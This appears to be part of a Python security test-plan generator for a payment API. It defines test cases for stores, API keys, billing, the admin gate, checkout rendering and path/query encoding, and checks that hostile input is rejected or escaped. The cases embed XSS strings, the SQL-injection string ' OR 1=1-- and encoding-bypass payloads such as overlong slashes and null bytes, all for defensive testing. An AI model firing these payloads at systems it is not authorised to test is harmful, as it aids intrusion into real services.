        ("patch_name", {"name": "Renamed Store"}, [200]),
        ("patch_empty_name", {"name": ""}, [422]),
        ("patch_xss_name", {"name": "<img src=x onerror=alert(1)>"}, [200, 422]),
        ("patch_brand_color", {"brand_color": "#fff"}, [200, 403]),
        ("patch_null_field", {"name": None}, [200]),
        ("patch_unknown_field", {"surprise": 1}, [200]),
    ):
        cases.append(
            _case(
                nxt("STO"),
                "stores",
                f"PATCH /v1/stores/{{id}} {label}",
                severity=SEV_MEDIUM,
                method="PATCH",
                path="/v1/stores/$store",
                body=body,
                expect={"status_in": allowed},
                requires=["store"],
                mutates=True,
                serial=True,
                informational=True,
            ),
        )
    cases.append(
        _case(
            nxt("STO"),
            "stores",
            "POST /v1/stores/{id}/telegram/test sends, or fails loudly",
            severity=SEV_LOW,
            method="POST",
            path="/v1/stores/$store/telegram/test",
            # 200 only after Telegram accepted the message; 400 when the store has
            # no chat id; 503 when the deployment holds no bot token (the same
            # governed 5xx the Bakong cases list). The outcome this guards against
            # is a 500, or an `ok: true` that never sent anything.
            expect={"status_in": [200, 400, 404, 503]},
            requires=["store"],
            informational=True,
            note="503 telegram_not_configured is expected until TELEGRAM_BOT_TOKEN is set.",
        ),
    )
    cases.append(
        _case(
            nxt("STO"),
            "stores",
            "POST /v1/stores/{id}/disable is destructive and reversible",
            severity=SEV_MEDIUM,
            method="POST",
            path="/v1/stores/$store/disable",
            expect={"status_in": [200], "json_equals": {"status": "disabled"}},
            requires=["store"],
            mutates=True,
            destructive=True,
            note="Destructive: a disabled store refuses new payments.",
        ),
    )

    for label, body, allowed in (
        ("minimal", {"name": "test-key"}, [201]),
        ("empty_name", {"name": ""}, [422]),
        ("long_name", {"name": "k" * 65}, [422]),
        ("xss_name", {"name": "<script>alert(1)</script>"}, [201, 400]),
        ("extra_field", {"name": "k", "account_id": 1}, [422]),
        ("no_name", {}, [422]),
    ):
        cases.append(
            _case(
                nxt("KEY"),
                "keys",
                f"POST /v1/keys {label}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/keys",
                body=body,
                expect={"status_in": allowed},
                mutates=True,
                informational=True,
                note="Plan caps legitimately return 400 max keys reached.",
            ),
        )
    for path in ("/v1/keys/0/revoke", "/v1/keys/999999/revoke", "/v1/keys/abc/revoke", "/v1/keys/-1/rotate", "/v1/keys/999999/rotate"):
        cases.append(
            _case(
                nxt("KEY"),
                "keys",
                f"POST {path} rejects an unknown key id",
                severity=SEV_MEDIUM,
                method="POST",
                path=path,
                expect={"status_in": [404, 422]},
            ),
        )
    cases.append(
        _case(
            nxt("KEY"),
            "keys",
            "A freshly created key is returned exactly once in plaintext",
            severity=SEV_CRITICAL,
            serial=True,
            mutates=True,
            destructive=True,
            check="raw_key_once",
            steps=[
                {
                    "name": "create",
                    "method": "POST",
                    "path": "/v1/keys",
                    "body": {"name": "integration-ephemeral"},
                    "expect": {"status": 201, "json_has": ["raw_key", "key_prefix", "id"]},
                    "capture": {"new_key_id": "$.id", "new_key_raw": "$.raw_key"},
                },
                {
                    "name": "list_hides_raw",
                    "method": "GET",
                    "path": "/v1/keys",
                    "expect": {"status": 200, "json_absent": ["key_hash"]},
                },
                {
                    "name": "revoke",
                    "method": "POST",
                    "path": "/v1/keys/$new_key_id/revoke",
                    "expect": {"status": 200, "json_equals": {"status": "revoked"}},
                },
                {
                    "name": "revoked_key_denied",
                    "method": "GET",
                    "path": "/v1/stores",
                    "auth": "raw_key",
                    "headers": {"Authorization": "Bearer $new_key_raw"},
                    "expect": {"status": 401, "detail": "unauthorized"},
                },
            ],
            note="Destructive: creates and revokes a throwaway key.",
        ),
    )
    for path in ("/v1/billing/subscription", "/v1/billing/invoices"):
        cases.append(
            _case(
                nxt("BIL"),
                "billing",
                f"GET {path} requires a session, not an API key",
                severity=SEV_HIGH,
                path=path,
                expect={"status_in": [401]},
                note="Billing is cookie-scoped in this codebase; a 200 here would be a scope leak, so this gates the run.",
            ),
        )
    for body in (
        {"plan_code": "starter"},
        {"plan_code": "growth"},
        {"plan_code": "scale"},
        {"plan_code": "enterprise"},
        {"plan_code": "no-such-plan"},
        {"plan_code": ""},
        {"plan_code": "' OR 1=1--"},
        {"plan_code": "s"},
        {"plan_code": "x" * 33},
        {},
    ):
        cases.append(
            _case(
                nxt("BIL"),
                "billing",
                f"POST /v1/billing/change-plan {body.get('plan_code')!r}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/billing/change-plan",
                body=body,
                expect={"status_in": [200, 201, 400, 401, 402, 403, 404, 422]},
                informational=True,
                note="Session-only endpoint; informational when no cookie is present.",
            ),
        )
    for invoice_id in ("1", "0", "-1", "999999", "abc", "1.5", "' OR 1=1--"):
        cases.append(
            _case(
                nxt("BIL"),
                "billing",
                f"GET /v1/billing/invoices/{invoice_id}/khqr id validation",
                severity=SEV_MEDIUM,
                path=f"/v1/billing/invoices/{invoice_id}/khqr",
                expect={"status_in": [401, 404, 422]},
                informational=True,
            ),
        )
    for path in ("/v1/admin/accounts?per_page=1000", "/v1/admin/accounts?per_page=0", "/v1/admin/accounts?page=-1", "/v1/admin/accounts?q=' OR 1=1--"):
        cases.append(
            _case(
                nxt("ADM"),
                "admin",
                f"GET {path} is gated before pagination is applied",
                severity=SEV_CRITICAL,
                path=path,
                omit_credentials=True,
                expect={"status_in": [401, 403], "detail_in": ["forbidden", "unauthorized", "invalid_session"]},
                informational=True,
                note="The admin gate must run before any query work. 401 = the eager session dependency short-circuits the intended 403.",
            ),
        )
    for label, path, allowed in (
        ("checkout_xss_store_name", "/pay/$payment", [200, 404]),
        ("checkout_sqli_id", "/pay/' OR 1=1--", [404, 400]),
        ("checkout_status_unknown", "/pay/PUETcMUOKStjZsCb6zAl8kg9fMRGM85x/status", [404]),
    ):
        cases.append(
            _case(
                nxt("CHK"),
                "checkout",
                f"Public checkout rendering: {label}",
                severity=SEV_HIGH,
                path=path,
                auth="none",
                expect={"status_in": allowed, "check": "no_raw_script"},
                requires=[] if "payment" not in path else ["payment"],
                informational=label != "checkout_status_unknown",
                note="The checkout page must escape store branding — stored XSS here is critical.",
            ),
        )
    cases.append(
        _case(
            nxt("CHK"),
            "checkout",
            "Checkout HTML escapes hostile store name and branding",
            severity=SEV_CRITICAL,
            serial=True,
            mutates=True,
            requires=["api_key"],
            check="checkout_escapes_branding",
            steps=[
                {
                    "name": "create_hostile_store",
                    "method": "POST",
                    "path": "/v1/stores",
                    "body": {
                        "name": "<script>alert('xss')</script>",
                        "link": {"raw_link": PAYWAY_LINK, "merchant_account_id": "xss-test"},
                        "redirect_success_url": "javascript:alert(1)",
                    },
                    "expect": {"status_in": [201, 400, 403]},
                    "capture": {"hostile_store": "$.id"},
                },
                {
                    "name": "create_payment",
                    "method": "POST",
                    "path": "/v1/payments",
                    "body": {"amount": 1.00, "store": "$hostile_store"},
                    "expect": {"status_in": [201, 400]},
                    "capture": {"hostile_payment": "$.id"},
                },
                {
                    "name": "render_checkout",
                    "method": "GET",
                    "path": "/pay/$hostile_payment",
                    "auth": "none",
                    "expect": {"status_in": [200, 404], "check": "no_raw_script"},
                },
            ],
            note=(
                "A raw <script> or javascript: URL in the rendered checkout page is stored XSS on a page "
                "customers type card details into, so this gates the run."
            ),
        ),
    )
    return cases


def _encoding_cases() -> list[dict[str, Any]]:
    """Unicode / encoding normalisation on path and query values."""
    cases: list[dict[str, Any]] = []
    counter = 0
    payloads = [
        ("percent_encoded_slash", "%2f"),
        ("double_encoded_slash", "%252f"),
        ("overlong_slash", "%c0%af"),
        ("utf16_surrogate", "%ed%a0%80"),
        ("null_byte", "%00"),
        ("newline", "%0a"),
        ("carriage_return", "%0d"),
        ("tab", "%09"),
        ("backslash", "%5c"),
        ("fullwidth_slash", "%ef%bc%8f"),
        ("homoglyph_a", "%d0%b0"),
        ("rtl_override", "%e2%80%ae"),
        ("zero_width", "%e2%80%8b"),
        ("bom", "%ef%bb%bf"),
        ("mixed_case_hex", "%2F%2f"),
    ]
    for label, encoded in payloads:
        for base in ("/v1/stores/", "/v1/payments/"):
            counter += 1
            cases.append(
                _case(
                    f"ENC-{counter:03d}",
                    "encoding",
                    f"{base}{encoded} ({label}) is contained",
                    severity=SEV_HIGH,
                    path=base + encoded,
                    expect={"status_in": [400, 404, 405, 422]},
                    informational=True,
                    note="Encoding tricks must never reach the filesystem or SQL.",
                ),
            )
        counter += 1
        cases.append(
            _case(
                f"ENC-{counter:03d}",
                "encoding",
                f"query value {encoded} ({label}) is contained",
                severity=SEV_MEDIUM,
                path="/v1/payments",
                query_raw=f"status={encoded}&store=$store",
                expect={"status_in": [200, 422], "check": "limit_bounds"},
                requires=["store"],
                informational=True,
            ),
        )
    return cases


# --------------------------------------------------------------------------- #
# Assembly
# --------------------------------------------------------------------------- #
GROUPS: list[dict[str, str]] = [
    {"id": "setup", "label": "Setup / fixtures", "description": "Creates or resolves the store, payment and webhook the other groups need."},
    {"id": "smoke", "label": "Smoke", "description": "Is the service up and are the envelopes well-formed?"},
    {"id": "auth", "label": "Auth & authorisation", "description": "Missing, malformed and wrong-scope credentials; mass assignment; admin gate."},
    {"id": "headers", "label": "Header handling", "description": "Proxy-header trust, host poisoning, verb tunnelling, trace ids."},
    {"id": "query", "label": "Query & path abuse", "description": "Param pollution plus SQLi / XSS / traversal payloads."},
    {"id": "encoding", "label": "Encoding", "description": "Overlong, double-encoded and unicode path/query values."},
    {"id": "amount", "label": "Amount validation", "description": "Money boundary matrix on payments and KHQR generation."},
    {"id": "khqr", "label": "KHQR / PayWay link", "description": f"Generates real KHQRs from {PAYWAY_LINK} and probes the live link status."},
    {"id": "live-pay", "label": "Live scan (real QR)", "description": "Renders a genuinely scannable QR from the PayWay link and watches ABA's own status — includes a manual phone-scan case."},
    {"id": "payments", "label": "Payments lifecycle", "description": "Create, read, list, checkout, scan, pay, idempotency, metadata."},
    {"id": "concurrency", "label": "Concurrency", "description": "Races that would double-charge or double-credit."},
    {"id": "transactions", "label": "Bakong transactions", "description": "Hash / MD5 / short-hash / ref lookups, bulk search, receipt verify."},
    {"id": "reports", "label": "Reports", "description": "CSV / JSON exports, date filters, pagination bounds."},
    {"id": "webhooks", "label": "Webhooks", "description": "Endpoint CRUD, SSRF URLs, signature format, delivery log."},
    {"id": "stores", "label": "Stores", "description": "Provisioning, PayWay link attach, branding entitlement."},
    {"id": "keys", "label": "API keys", "description": "Creation, one-time plaintext, revoke, rotate."},
    {"id": "billing", "label": "Billing", "description": "Subscription, plans, invoices, self-pay KHQR."},
    {"id": "admin", "label": "Admin", "description": "Platform-admin gate on the operator surface."},
    {"id": "checkout", "label": "Checkout rendering", "description": "Public /pay/{id} page escaping and existence privacy."},
]


def build_test_plan() -> dict[str, Any]:
    """Assemble the full catalog. Deterministic — safe to cache."""
    cases: list[dict[str, Any]] = []
    for builder in (
        _setup_cases,
        _smoke_cases,
        _auth_cases,
        _header_cases,
        _param_cases,
        _encoding_cases,
        _amount_cases,
        _khqr_cases,
        _live_pay_cases,
        _payment_cases,
        _concurrency_cases,
        _transaction_cases,
        _report_cases,
        _webhook_cases,
        _surface_cases,
    ):
        cases.extend(builder())

    seen: set[str] = set()
    for case in cases:
        if case["id"] in seen:
            raise ValueError(f"duplicate case id: {case['id']}")
        seen.add(case["id"])

    by_group: dict[str, int] = {}
    by_severity: dict[str, int] = {}
    for case in cases:
        by_group[case["group"]] = by_group.get(case["group"], 0) + 1
        by_severity[case["severity"]] = by_severity.get(case["severity"], 0) + 1

    return {
        "version": PLAN_VERSION,
        "generated_at": datetime.now(UTC).isoformat(),
        "payway_link": PAYWAY_LINK,
        "total": len(cases),
        "by_group": by_group,
        "by_severity": by_severity,
        "counts": {
            "network": sum(1 for c in cases if c.get("network")),
            "mutating": sum(1 for c in cases if c.get("mutates")),
            "destructive": sum(1 for c in cases if c.get("destructive")),
            "informational": sum(1 for c in cases if c.get("informational")),
        },
        "groups": GROUPS,
        "cases": cases,
    }


if __name__ == "__main__":  # pragma: no cover - manual inspection helper
    import json

    plan = build_test_plan()
    print(json.dumps({k: v for k, v in plan.items() if k != "cases"}, indent=2))
    print(f"total cases: {plan['total']}")
